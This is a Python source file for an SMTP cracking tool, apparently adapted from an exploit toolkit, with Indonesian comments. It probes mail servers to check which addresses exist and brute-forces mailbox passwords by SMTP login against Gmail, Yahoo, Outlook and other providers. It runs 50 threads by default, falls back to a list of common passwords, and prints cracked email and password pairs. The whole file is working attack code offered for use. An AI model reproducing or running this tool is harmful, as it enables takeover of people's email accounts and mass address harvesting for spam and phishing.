#!/usr/bin/env python3
"""
SMTP CRACKER MODULE v1.0
=========================
SMTP cracker untuk email validation dan brute force
Diadaptasi dari AlienExploit Tool12
"""

import smtplib
import socket
import re
import json
import threading
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# Common SMTP ports
SMTP_PORTS = [25, 465, 587, 2525]

# Common email providers
EMAIL_PROVIDERS = {
    'gmail.com': ('smtp.gmail.com', 587),
    'yahoo.com': ('smtp.mail.yahoo.com', 587),
    'hotmail.com': ('smtp.live.com', 587),
    'outlook.com': ('smtp.live.com', 587),
    'aol.com': ('smtp.aol.com', 587),
    'icloud.com': ('smtp.mail.me.com', 587),
    'zoho.com': ('smtp.zoho.com', 587),
    'protonmail.com': ('smtp.protonmail.ch', 587),
    'yandex.com': ('smtp.yandex.com', 587),
    'mail.com': ('smtp.mail.com', 587),
    'gmx.com': ('smtp.gmx.com', 587),
    'inbox.com': ('smtp.inbox.com', 587),
}


class SMTPCracker:
    """SMTP email validator dan cracker."""
    
    def __init__(self):
        self.valid_emails = []
        self.lock = threading.Lock()
    
    def validate_email(self, email):
        """Validate single email via SMTP."""
        try:
            domain = email.split('@')[1]
            
            # Get SMTP server
            if domain in EMAIL_PROVIDERS:
                smtp_host, smtp_port = EMAIL_PROVIDERS[domain]
            else:
                # Try MX record
                try:
                    import dns.resolver
                    mx_records = dns.resolver.resolve(domain, 'MX')
                    mx_host = str(mx_records[0].exchange).rstrip('.')
                    smtp_host = mx_host
                    smtp_port = 25
                except:
                    smtp_host = f'smtp.{domain}'
                    smtp_port = 25
            
            # Try SMTP connection
            try:
                if smtp_port == 465:
                    server = smtplib.SMTP_SSL(smtp_host, smtp_port, timeout=10)
                else:
                    server = smtplib.SMTP(smtp_host, smtp_port, timeout=10)
                    server.starttls()
                
                server.ehlo()
                server.mail('test@test.com')
                code, message = server.rcpt(email)
                server.quit()
                
                if code == 250:
                    return True, email, 'VALID'
                else:
                    return False, email, f'INVALID (code: {code})'
            except smtplib.SMTPRecipientsRefused:
                return False, email, 'REFUSED'
            except smtplib.SMTPServerDisconnected:
                return False, email, 'DISCONNECTED'
            except socket.timeout:
                return False, email, 'TIMEOUT'
            except Exception as e:
                return False, email, f'ERROR: {str(e)[:50]}'
        except:
            return False, email, 'INVALID_FORMAT'
    
    def crack_email(self, email, passwords):
        """Crack email password via SMTP."""
        try:
            domain = email.split('@')[1]
            
            if domain in EMAIL_PROVIDERS:
                smtp_host, smtp_port = EMAIL_PROVIDERS[domain]
            else:
                try:
                    import dns.resolver
                    mx_records = dns.resolver.resolve(domain, 'MX')
                    smtp_host = str(mx_records[0].exchange).rstrip('.')
                    smtp_port = 25
                except:
                    return False, email, None, None
            
            for passwd in passwords:
                try:
                    if smtp_port == 465:
                        server = smtplib.SMTP_SSL(smtp_host, smtp_port, timeout=10)
                    else:
                        server = smtplib.SMTP(smtp_host, smtp_port, timeout=10)
                        server.starttls()
                    
                    server.login(email, passwd)
                    server.quit()
                    
                    console.print(f"  [green]✓ SMTP CRACKED: {email}:{passwd}[/green]")
                    return True, email, smtp_host, passwd
                except smtplib.SMTPAuthenticationError:
                    continue
                except:
                    continue
            
            return False, email, None, None
        except:
            return False, email, None, None
    
    def validate_mass(self, emails, threads=50):
        """Validate multiple emails."""
        console.print(f"\n[bold cyan]MASS EMAIL VALIDATION[/bold cyan]")
        console.print(f"  Emails: {len(emails)}")
        console.print(f"  Threads: {threads}")
        
        results = []
        
        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(), console=console
        ) as progress:
            task = progress.add_task("[cyan]Validating emails...", total=len(emails))
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(self.validate_email, e): e for e in emails}
                for future in as_completed(futures):
                    progress.update(task, advance=1)
                    try:
                        is_valid, email, status = future.result()
                        if is_valid:
                            with self.lock:
                                self.valid_emails.append(email)
                                results.append({'email': email, 'status': status})
                    except:
                        pass
        
        # Summary
        console.print(f"\n[bold green]EMAIL VALIDATION COMPLETE[/bold green]")
        console.print(f"  Valid: {len(self.valid_emails)}")
        console.print(f"  Invalid: {len(emails) - len(self.valid_emails)}")
        
        if self.valid_emails:
            table = Table(title="Valid Emails")
            table.add_column("Email", width=40)
            for e in self.valid_emails[:20]:
                table.add_row(e)
            console.print(table)
        
        return results
    
    def crack_mass(self, emails, passwords, threads=50):
        """Crack multiple emails."""
        console.print(f"\n[bold cyan]MASS SMTP CRACKER[/bold cyan]")
        console.print(f"  Emails: {len(emails)}")
        console.print(f"  Passwords: {len(passwords)}")
        console.print(f"  Threads: {threads}")
        
        results = []
        
        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(), console=console
        ) as progress:
            task = progress.add_task("[cyan]Cracking emails...", total=len(emails))
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(self.crack_email, e, passwords): e for e in emails}
                for future in as_completed(futures):
                    progress.update(task, advance=1)
                    try:
                        success, email, smtp_host, passwd = future.result()
                        if success:
                            with self.lock:
                                results.append({
                                    'email': email,
                                    'smtp_host': smtp_host,
                                    'password': passwd
                                })
                    except:
                        pass
        
        # Summary
        console.print(f"\n[bold green]SMTP CRACKER COMPLETE[/bold green]")
        console.print(f"  Cracked: {len(results)}")
        
        if results:
            table = Table(title="Cracked Emails")
            table.add_column("Email", width=30)
            table.add_column("SMTP Host", width=25)
            table.add_column("Password", width=15)
            for r in results:
                table.add_row(r['email'], r['smtp_host'], r['password'])
            console.print(table)
        
        return results


def main():
    import argparse
    parser = argparse.ArgumentParser(description="SMTP Cracker")
    parser.add_argument("-l", "--list", help="Email list file")
    parser.add_argument("-e", "--email", help="Single email")
    parser.add_argument("--mode", default="validate", choices=["validate", "crack"], help="Mode")
    parser.add_argument("-p", "--passwords", help="Password list file for crack mode")
    parser.add_argument("--threads", type=int, default=50)
    args = parser.parse_args()
    
    emails = []
    if args.list:
        with open(args.list) as f:
            emails = [l.strip() for l in f if l.strip() and '@' in l]
    elif args.email:
        emails = [args.email]
    else:
        console.print("[red]Error: Specify -l list.txt or -e email[/red]")
        return
    
    passwords = []
    if args.mode == 'crack':
        if args.passwords:
            with open(args.passwords) as f:
                passwords = [l.strip() for l in f if l.strip()]
        else:
            passwords = ['password', '123456', '12345678', 'qwerty', 'abc123', 'admin', 'letmein', 'welcome']
    
    cracker = SMTPCracker()
    
    if args.mode == 'validate':
        cracker.validate_mass(emails, args.threads)
    else:
        cracker.crack_mass(emails, passwords, args.threads)


if __name__ == "__main__":
    main()
